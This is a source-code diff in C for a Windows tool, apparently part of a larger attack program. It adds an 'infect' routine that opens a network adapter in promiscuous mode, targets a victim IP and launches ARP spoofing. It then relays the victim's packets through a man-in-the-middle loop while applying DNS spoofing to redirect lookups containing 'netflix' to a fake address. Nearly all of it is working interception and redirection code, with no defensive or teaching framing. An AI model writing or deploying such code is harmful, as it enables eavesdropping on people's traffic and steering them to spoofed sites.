@@ -1,10 +1,16 @@
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-#include "spoof.h"
+#include "infect.h"
 
-extern send_params infect_params;
-BOOL finished_infecting = 0;
+#include <malloc.h>
+
+#include "commands.h"
+#include "network_headers.h"
+#include "utils.h"
+
+static BOOL finished_infecting;
+send_params infect_params;
 static char* keyword = "netflix";
 u_long fake_web = 264000259; // TODO 
 
@@ -179,4 +185,143 @@ size_t dns_spoofing(u_char* packet, size_t packet_size)
 	}
 	
 	return (BYTE*)temp_p - packet;
+}
+
+DWORD WINAPI infect(LPVOID lparam)
+{
+	pCommand command = (pCommand)lparam;
+
+	PIP_ADAPTER_INFO pAdapterInfo = NULL;
+	ULONG outBufLen = 0;
+	ULONG netmask, host;
+
+	pcap_t* fp;
+	pcap_if_t* alldevs = NULL, * adapter;
+	pcap_addr_t* addr;
+
+	char* filter;
+	size_t filter_size;
+	char temp_filter[] = "ip host";
+	struct in_addr n_addr;
+	struct bpf_program fcode;
+
+	int res;
+	struct pcap_pkthdr* pkt_header;
+	const u_char* pkt_data = NULL;
+	size_t packet_size;
+
+
+	/* allocate heap memory */
+	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
+	filter_size = strlen(temp_filter) + strlen(inet_ntoa(n_addr)) + 2; // space and null terminator (2).
+	filter = (char*)malloc(filter_size);
+
+	GetAdaptersInfo(pAdapterInfo, &outBufLen);
+	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
+
+	pcap_findalldevs(&alldevs, NULL);
+
+	/* check if allocation worked successfully */
+	if (!pAdapterInfo || !filter || !alldevs)
+		return -1;
+
+	GetAdaptersInfo(pAdapterInfo, &outBufLen);
+
+	for (adapter = alldevs; adapter; adapter = adapter->next)
+	{
+		int found = 0; //false
+		for (addr = adapter->addresses; addr; addr = addr->next)
+		{
+			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
+			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;
+
+			if ((host & netmask) == (command->victim_ip & netmask))
+			{
+				found = 1; //true
+				break;
+			}
+		}
+		if (found)
+			break;
+	}
+
+	if (!adapter)
+		return -1;
+
+	/*open the adapter*/
+	fp = pcap_open(
+		adapter->name,
+		65536,
+		PCAP_OPENFLAG_PROMISCUOUS,
+		1000,
+		NULL,
+		NULL
+	);
+
+	/* create filter */
+	snprintf(filter, filter_size, "%s %s\n", temp_filter, inet_ntoa(n_addr));
+	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
+	{
+		free(pAdapterInfo);
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+
+	if (pcap_setfilter(fp, &fcode) < 0)
+	{
+		free(pAdapterInfo);
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+
+	infect_params.fp = fp;
+	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
+
+	/*start send_packet thread*/
+	HANDLE hThread;
+	hThread = CreateThread(NULL, 0, start_arp_spoofing, NULL, 0, NULL);
+	if (!hThread)
+	{
+		pcap_close(fp);
+		return -1;
+	}
+
+	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
+	{
+		/* Timeout elapsed */
+		if (res == 0)
+		{
+			if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
+			{
+				CloseHandle(hThread);
+				break;
+			}
+			continue;
+		}
+
+		ether_hdr* eth_header;
+		eth_header = (ether_hdr*)pkt_data;
+
+		/* Check for DNS packets */
+		packet_size = dns_spoofing(pkt_data, pkt_header->caplen);
+
+		/* change packet src/dst (MITM) */
+		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
+			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
+			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
+		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
+
+		/* foward packet */
+		pcap_sendpacket(fp, pkt_data, packet_size);
+
+		/* redirect worked */
+		if (finished_infecting)
+		{
+			stop_arp_spoofing();
+			CloseHandle(hThread);
+			break;
+		}
+	}
+
+	return 0;
 }
